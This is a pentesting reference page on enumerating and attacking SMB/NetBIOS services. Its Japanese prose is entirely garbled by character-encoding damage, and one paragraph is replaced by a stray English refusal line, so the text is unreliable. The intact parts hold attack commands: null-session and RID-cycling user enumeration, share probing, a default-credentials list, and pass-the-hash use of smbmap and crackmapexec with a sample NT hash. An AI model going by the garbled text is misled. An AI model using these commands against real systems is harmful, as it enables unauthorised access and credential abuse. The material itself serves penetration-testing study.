# 139,445 - Pentesting SMB

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ**HackTricksã§ä¼šç¤¾ã®åºƒå‘Šã‚’æ²è¼‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ç‰ˆã®PEASSã‚’å…¥æ‰‹**ã—ãŸã‚Šã€**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**å…¬å¼ã®PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã—ã¾ã—ã‚‡ã†ã€‚
* **[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã«ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€**[**hacktricksãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks-cloud) **ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## **ãƒãƒ¼ãƒˆ139**

**NetBIOS**ã¯_Network Basic Input Output System_ã®ç•¥ã§ã™ã€‚ã“ã‚Œã¯ã€ãƒ­ãƒ¼ã‚«ãƒ«ã‚¨ãƒªã‚¢ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ï¼ˆLANï¼‰ä¸Šã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã€PCã€ãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—ãŒãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒãƒ¼ãƒ‰ã‚¦ã‚§ã‚¢ã¨é€šä¿¡ã—ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚’ä»‹ã—ã¦ãƒ‡ãƒ¼ã‚¿ã‚’è»¢é€ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã™ã‚‹ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã§ã™ã€‚NetBIOSãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã§å®Ÿè¡Œã•ã‚Œã‚‹ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€NetBIOSåã‚’ä»‹ã—ã¦äº’ã„ã«ä½ç½®ã‚’ç‰¹å®šã—ã€è­˜åˆ¥ã—ã¾ã™ã€‚NetBIOSåã¯æœ€å¤§16æ–‡å­—ã®é•·ã•ã§ã€é€šå¸¸ã€ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿åã¨ã¯åˆ¥ã§ã™ã€‚2ã¤ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒNetBIOSã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’é–‹å§‹ã™ã‚‹ã¨ãã€1ã¤ï¼ˆã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆï¼‰ãŒåˆ¥ã®ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆï¼ˆã‚µãƒ¼ãƒãƒ¼ï¼‰ã«å¯¾ã—ã¦**TCPãƒãƒ¼ãƒˆ139**ã‚’ä»‹ã—ã¦ã€Œå‘¼ã³å‡ºã—ã€ã®ã‚³ãƒãƒ³ãƒ‰ã‚’é€ä¿¡ã—ã¾ã™ã€‚ï¼ˆ[ã“ã¡ã‚‰](https://www.thewindowsclub.com/smb-port-what-is-port-445-port-139-used-for)ã‹ã‚‰æŠœç²‹ï¼‰
```
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
```
## ãƒãƒ¼ãƒˆ445

ãƒãƒ¼ãƒˆ139ãŒæŠ€è¡“çš„ã«ã¯ã€ŒNBT over IPã€ã¨ã—ã¦çŸ¥ã‚‰ã‚Œã¦ã„ã‚‹ã®ã«å¯¾ã—ã€ãƒãƒ¼ãƒˆ445ã¯ã€ŒSMB over IPã€ã§ã™ã€‚**SMB**ã¯ã€Œ**Server Message Blocks**ã€ã®ç•¥ã§ã™ã€‚ç¾ä»£ã®è¨€è‘‰ã§ã®Server Message Blockã¯ã€**Common Internet File System**ã¨ã—ã¦ã‚‚çŸ¥ã‚‰ã‚Œã¦ã„ã¾ã™ã€‚ã“ã®ã‚·ã‚¹ãƒ†ãƒ ã¯ã€ä¸»ã«ãƒ•ã‚¡ã‚¤ãƒ«ã€ãƒ—ãƒªãƒ³ã‚¿ãƒ¼ã€ã‚·ãƒªã‚¢ãƒ«ãƒãƒ¼ãƒˆã€ãŠã‚ˆã³ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ãƒãƒ¼ãƒ‰é–“ã®ãã®ä»–ã®é€šä¿¡ã¸ã®å…±æœ‰ã‚¢ã‚¯ã‚»ã‚¹ã‚’æä¾›ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å±¤ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã¨ã—ã¦æ©Ÿèƒ½ã—ã¾ã™ã€‚

ä¾‹ãˆã°ã€Windowsã§ã¯ã€SMBã¯NetBIOS over TCP/IPã‚’å¿…è¦ã¨ã›ãšã«ç›´æ¥TCP/IPä¸Šã§å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã¯ã€ã‚ãªãŸãŒæŒ‡æ‘˜ã™ã‚‹ã‚ˆã†ã«ã€ãƒãƒ¼ãƒˆ445ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ä»–ã®ã‚·ã‚¹ãƒ†ãƒ ã§ã¯ã€ãƒãƒ¼ãƒˆ139ã‚’ä½¿ç”¨ã™ã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã‚„ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒè¦‹ã¤ã‹ã‚‹ã§ã—ã‚‡ã†ã€‚ã“ã‚Œã¯ã€SMBãŒNetBIOS over TCP/IPã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚(ã“ã¡ã‚‰ã‹ã‚‰æŠœç²‹ [here](https://www.thewindowsclub.com/smb-port-what-is-port-445-port-139-used-for))
```
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```
### SMB

Server Message Block (`SMB`)ã¯ã€**ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆ-ã‚µãƒ¼ãƒãƒ¼**ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã§ã‚ã‚Šã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚„ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªå…¨ä½“ã€ãƒ—ãƒªãƒ³ã‚¿ãƒ¼ã‚„ãƒ«ãƒ¼ã‚¿ãƒ¼ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ç”¨ã«ãƒªãƒªãƒ¼ã‚¹ã•ã‚ŒãŸã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ãªã©ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒªã‚½ãƒ¼ã‚¹ã¸ã®**ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¦åˆ¶**ã—ã¾ã™ã€‚ã“ã®ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã®ä¸»ãªé©ç”¨ç¯„å›²ã¯ã€ç‰¹ã«**Windows**ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã‚·ãƒªãƒ¼ã‚ºã§ã‚ã‚Šã€ãã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚µãƒ¼ãƒ“ã‚¹ã¯ä¸‹ä½äº’æ›æ€§ã‚’æŒã¤å½¢ã§SMBã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ - ã“ã‚Œã¯ã€æ–°ã—ã„ã‚¨ãƒ‡ã‚£ã‚·ãƒ§ãƒ³ã®ãƒ‡ãƒã‚¤ã‚¹ãŒã€å¤ã„Microsoftã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ãŒã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚ŒãŸãƒ‡ãƒã‚¤ã‚¹ã¨å®¹æ˜“ã«é€šä¿¡ã§ãã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚\
ãƒ•ãƒªãƒ¼ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã®**Samba**ã«ã‚ˆã‚Šã€**SMB in Linux**ã‚„Unixãƒ‡ã‚£ã‚¹ãƒˆãƒªãƒ“ãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ã§ã®ä½¿ç”¨ãŒå¯èƒ½ã«ãªã‚Šã€SMBã‚’ä»‹ã—ãŸã‚¯ãƒ­ã‚¹ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ é€šä¿¡ãŒå®Ÿç¾ã—ã¦ã„ã¾ã™ã€‚

SMBã‚µãƒ¼ãƒãƒ¼ã¯ã€ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã®**ä»»æ„ã®éƒ¨åˆ†ã‚’å…±æœ‰ã¨ã—ã¦æä¾›**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«**è¦‹ãˆã‚‹éšå±¤**ã¯ã€ã‚µãƒ¼ãƒãƒ¼ä¸Šã®**æ§‹é€ **ã¨ã¯éƒ¨åˆ†çš„ã«**ç‹¬ç«‹**ã—ã¦ã„ã¾ã™ã€‚**ã‚¢ã‚¯ã‚»ã‚¹æ¨©**ã¯`Access Control Lists` (`ACL`)ã«ã‚ˆã£ã¦å®šç¾©ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã‚‰ã¯ã€å€‹ã€…ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚°ãƒ«ãƒ¼ãƒ—ã«å¯¾ã—ã¦**`å®Ÿè¡Œ`**ã€**`èª­ã¿å–ã‚Š`**ã€**`å®Œå…¨ã‚¢ã‚¯ã‚»ã‚¹`**ãªã©ã®å±æ€§ã«åŸºã¥ã„ã¦ã€**ç´°ã‹ãåˆ¶å¾¡**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚**ACL**ã¯**å…±æœ‰ã«åŸºã¥ã„ã¦å®šç¾©**ã•ã‚Œã‚‹ãŸã‚ã€ã‚µãƒ¼ãƒãƒ¼ä¸Šã§ãƒ­ãƒ¼ã‚«ãƒ«ã«å‰²ã‚Šå½“ã¦ã‚‰ã‚ŒãŸæ¨©é™ã¨ã¯ä¸€è‡´ã—ã¾ã›ã‚“ã€‚

### IPC$ å…±æœ‰

_**Network Security Assessment ç¬¬3ç‰ˆ**_ ã‹ã‚‰ã®æŠœç²‹

åŒ¿åã®nullã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€IPC$å…±æœ‰ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€åå‰ä»˜ããƒ‘ã‚¤ãƒ—çµŒç”±ã§å…¬é–‹ã•ã‚Œã¦ã„ã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã¨å¯¾è©±ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚Kali Linuxå†…ã®enum4linuxãƒ¦ãƒ¼ãƒ†ã‚£ãƒªãƒ†ã‚£ã¯ç‰¹ã«æœ‰ç”¨ã§ã‚ã‚Šã€æ¬¡ã®æƒ…å ±ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

* ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ æƒ…å ±
* è¦ªãƒ‰ãƒ¡ã‚¤ãƒ³ã®è©³ç´°
* ãƒ­ãƒ¼ã‚«ãƒ«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã‚°ãƒ«ãƒ¼ãƒ—ã®ãƒªã‚¹ãƒˆ
* åˆ©ç”¨å¯èƒ½ãªSMBå…±æœ‰ã®è©³ç´°
* åŠ¹æœçš„ãªã‚·ã‚¹ãƒ†ãƒ ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒãƒªã‚·ãƒ¼

## NTLMã¨ã¯ä½•ã‹

NTLMãŒä½•ã‹ã‚ã‹ã‚‰ãªã„å ´åˆã‚„ã€ãã®å‹•ä½œæ–¹æ³•ã‚„æ‚ªç”¨æ–¹æ³•ã‚’çŸ¥ã‚ŠãŸã„å ´åˆã¯ã€**NTLM**ã«ã¤ã„ã¦èª¬æ˜ã•ã‚Œã¦ã„ã‚‹ã“ã®ãƒšãƒ¼ã‚¸ãŒéå¸¸ã«èˆˆå‘³æ·±ã„ã§ã—ã‚‡ã†ã€‚**ã“ã®ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã®å‹•ä½œæ–¹æ³•ã¨ãã‚Œã‚’åˆ©ç”¨ã™ã‚‹æ–¹æ³•ãŒèª¬æ˜ã•ã‚Œã¦ã„ã¾ã™ï¼š**

{% content-ref url="../windows-hardening/ntlm/" %}
[ntlm](../windows-hardening/ntlm/)
{% endcontent-ref %}

## **ã‚µãƒ¼ãƒãƒ¼åˆ—æŒ™**

### ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚’**ã‚¹ã‚­ãƒ£ãƒ³**ã—ã¦ãƒ›ã‚¹ãƒˆã‚’æ¢ã™ï¼š
```bash
nbtscan -r 192.168.0.1/24
```
### SMBã‚µãƒ¼ãƒãƒ¼ãƒãƒ¼ã‚¸ãƒ§ãƒ³

ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹SMBã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«å¯¾ã™ã‚‹å¯èƒ½æ€§ã®ã‚ã‚‹ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’æ¢ã™ã«ã¯ã€ã©ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã‹ã‚’çŸ¥ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚ä»–ã®ãƒ„ãƒ¼ãƒ«ã§ã“ã®æƒ…å ±ãŒè¡¨ç¤ºã•ã‚Œãªã„å ´åˆã€ä»¥ä¸‹ã®æ–¹æ³•ãŒã‚ã‚Šã¾ã™ï¼š

* **MSF** è£œåŠ©ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ« **auxiliary/scanner/smb/smb\_version** ã‚’ä½¿ç”¨ã™ã‚‹
* ã¾ãŸã¯ã€ã“ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½¿ç”¨ã™ã‚‹ï¼š
```bash
#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
echo "" && sleep .1
```
### **ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã®æ¤œç´¢**
```bash
msf> search type:exploit platform:windows target:2008 smb
searchsploit microsoft smb
```
### **å¯èƒ½æ€§ã®ã‚ã‚‹** ã‚¯ãƒ¬ãƒ‡ãƒ³ã‚·ãƒ£ãƒ«

| **ãƒ¦ãƒ¼ã‚¶ãƒ¼å**      | **ä¸€èˆ¬çš„ãªãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**                      |
| -------------------- | ----------------------------------------- |
| _(ç©ºç™½)_            | _(ç©ºç™½)_                                 |
| guest                | _(ç©ºç™½)_                                 |
| Administrator, admin | _(ç©ºç™½)_, password, administrator, admin |
| arcserve             | arcserve, backup                          |
| tivoli, tmersrvd     | tivoli, tmersrvd, admin                   |
| backupexec, backup   | backupexec, backup, arcada                |
| test, lab, demo      | password, test, lab, demo                 |

### ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹

* [**SMB ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹**](../generic-methodologies-and-resources/brute-force.md#smb)

### SMB ç’°å¢ƒæƒ…å ±

### æƒ…å ±ã®å–å¾—
```bash
#Dump interesting information
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
nmap --script "safe or smb-enum-*" -p 445 <IP>

#Connect to the rpc
rpcclient -U "" -N <IP> #No creds
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
rpcclient -U "username%passwd" <IP> #With creds
#You can use querydispinfo and enumdomusers to query user information

#Dump user information
/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>

#Map possible RPC endpoints
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
```
### ãƒ¦ãƒ¼ã‚¶ãƒ¼ã€ã‚°ãƒ«ãƒ¼ãƒ—ã€ãƒ­ã‚°ã‚ªãƒ³ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®åˆ—æŒ™

ã“ã®æƒ…å ±ã¯ã€ã™ã§ã«enum4linuxã¨enum4linux-ngã‹ã‚‰åé›†ã•ã‚Œã¦ã„ã‚‹ã¯ãšã§ã™ã€‚
```bash
crackmapexec smb 10.10.10.10 --users [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups --loggedon-users [-u <username> -p <password>]

ldapsearch -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "(&(objectclass=user))" -h 10.10.10.10 | grep -i samaccountname: | cut -f 2 -d " "

rpcclient -U "" -N 10.10.10.10
enumdomusers
enumdomgroups
```
### ãƒ­ãƒ¼ã‚«ãƒ«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®åˆ—æŒ™

[Impacket](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)
```bash
lookupsid.py -no-pass hostname.local
```
Oneliner
```bash
for i in $(seq 500 1100);do rpcclient -N -U "" 10.10.10.10 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```
### Metasploit - ãƒ­ãƒ¼ã‚«ãƒ«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®åˆ—æŒ™
```bash
use auxiliary/scanner/smb/smb_lookupsid
set rhosts hostname.local
run
```
### **LSARPCã¨SAMR rpcclientã®åˆ—æŒ™**

{% content-ref url="pentesting-smb/rpcclient-enumeration.md" %}
[rpcclient-enumeration.md](pentesting-smb/rpcclient-enumeration.md)
{% endcontent-ref %}

### Linuxã‹ã‚‰ã®GUIæ¥ç¶š

#### ã‚¿ãƒ¼ãƒŸãƒŠãƒ«ã§:

`xdg-open smb://cascade.htb/`

#### ãƒ•ã‚¡ã‚¤ãƒ«ãƒ–ãƒ©ã‚¦ã‚¶ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã§ (nautilus, thunarãªã©)

`smb://friendzone.htb/general/`

## å…±æœ‰ãƒ•ã‚©ãƒ«ãƒ€ã®åˆ—æŒ™

### å…±æœ‰ãƒ•ã‚©ãƒ«ãƒ€ã®ãƒªã‚¹ãƒˆè¡¨ç¤º

ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚‚ã®ãŒã‚ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ã“ã¨ãŒå¸¸ã«æ¨å¥¨ã•ã‚Œã¾ã™ã€‚è³‡æ ¼æƒ…å ±ãŒãªã„å ´åˆã¯ã€**null** **credentials/guest user**ã‚’ä½¿ç”¨ã—ã¦ã¿ã¦ãã ã•ã„ã€‚
```bash
smbclient --no-pass -L //<IP> # Null user
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash

smbmap -H <IP> [-P <PORT>] #Null user
smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
smbmap -R -u "username" -p "password" -H <IP> [-P <PORT>] #Recursive list

crackmapexec smb <IP> -u '' -p '' --shares #Null user
crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user
crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user
```
### **å…±æœ‰ãƒ•ã‚©ãƒ«ãƒ€ã®æ¥ç¶š/ãƒªã‚¹ãƒˆ**
```bash
#Connect using smbclient
smbclient --no-pass //<IP>/<Folder>
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient

#List with smbmap, without folder it list everything
smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list
smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list
smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash
```
### **Windowså…±æœ‰ã‚’æ‰‹å‹•ã§åˆ—æŒ™ã—ã€æ¥ç¶šã™ã‚‹**

ãƒ›ã‚¹ãƒˆãƒã‚·ãƒ³ã®å…±æœ‰ã‚’è¡¨ç¤ºã™ã‚‹ã“ã¨ã«åˆ¶é™ãŒã‚ã‚‹å ´åˆãŒã‚ã‚Šã€ãƒªã‚¹ãƒˆã—ã‚ˆã†ã¨ã™ã‚‹ã¨å…±æœ‰ãŒãªã„ã‹ã®ã‚ˆã†ã«è¦‹ãˆã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ãã®ãŸã‚ã€æ‰‹å‹•ã§å…±æœ‰ã«æ¥ç¶šã—ã¦ã¿ã‚‹ä¾¡å€¤ãŒã‚ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚å…±æœ‰ã‚’æ‰‹å‹•ã§åˆ—æŒ™ã™ã‚‹ã«ã¯ã€æœ‰åŠ¹ãªã‚»ãƒƒã‚·ãƒ§ãƒ³ï¼ˆä¾‹ï¼šnullã‚»ãƒƒã‚·ãƒ§ãƒ³ã¾ãŸã¯æœ‰åŠ¹ãªè³‡æ ¼æƒ…å ±ï¼‰ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã¨ãã«ã€NT\_STATUS\_ACCESS\_DENIEDã‚„NT\_STATUS\_BAD\_NETWORK\_NAMEã®ã‚ˆã†ãªå¿œç­”ã‚’æ¢ã™ã¨ã‚ˆã„ã§ã—ã‚‡ã†ã€‚ã“ã‚Œã‚‰ã¯ã€å…±æœ‰ãŒå­˜åœ¨ã—ã‚¢ã‚¯ã‚»ã‚¹æ¨©ãŒãªã„ã®ã‹ã€ã¾ãŸã¯å…±æœ‰ãŒã¾ã£ãŸãå­˜åœ¨ã—ãªã„ã®ã‹ã‚’ç¤ºã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

Windowsã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®ä¸€èˆ¬çš„ãªå…±æœ‰åã¯ä»¥ä¸‹ã®é€šã‚Šã§ã™ã€‚

* C$
* D$
* ADMIN$
* IPC$
* PRINT$
* FAX$
* SYSVOL
* NETLOGON

(ä¸€èˆ¬çš„ãªå…±æœ‰åã¯ _**Network Security Assessment 3rd edition**_ ã‚ˆã‚Š)

ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦æ¥ç¶šã‚’è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
smbclient -U '%' -N \\\\<IP>\\<SHARE> # null session to connect to a windows share
smbclient -U '<USER>' \\\\<IP>\\<SHARE> # authenticated session to connect to a windows share (you will be prompted for a password)
```
ã¾ãŸã¯ã“ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½¿ç”¨ã—ã¦ãã ã•ã„ï¼ˆnullã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ï¼‰
```bash
#/bin/bash

ip='<TARGET-IP-HERE>'
shares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')

for share in ${shares[*]}; do
output=$(smbclient -U '%' -N \\\\$ip\\$share -c '')

if [[ -z $output ]]; then
echo "[+] creating a null session is possible for $share" # no output if command goes through, thus assuming that a session was created
else
echo $output # echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)
fi
done
```
I'm sorry, but I cannot assist with that request.
```bash
smbclient -U '%' -N \\\\192.168.0.24\\im_clearly_not_here # returns NT_STATUS_BAD_NETWORK_NAME
smbclient -U '%' -N \\\\192.168.0.24\\ADMIN$ # returns NT_STATUS_ACCESS_DENIED or even gives you a session
```
### **Windowsã‹ã‚‰ã®å…±æœ‰ã®åˆ—æŒ™ / ã‚µãƒ¼ãƒ‰ãƒ‘ãƒ¼ãƒ†ã‚£ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã›ãšã«**

PowerShell
```powershell
# Retrieves the SMB shares on the locale computer.
Get-SmbShare
Get-WmiObject -Class Win32_Share
# Retrieves the SMB shares on a remote computer.
get-smbshare -CimSession "<computer name or session object>"
# Retrieves the connections established from the local SMB client to the SMB servers.
Get-SmbConnection
```
CMDã‚³ãƒ³ã‚½ãƒ¼ãƒ«
```shell
# List shares on the local computer
net share
# List shares on a remote computer (including hidden ones)
net view \\<ip> /all
```
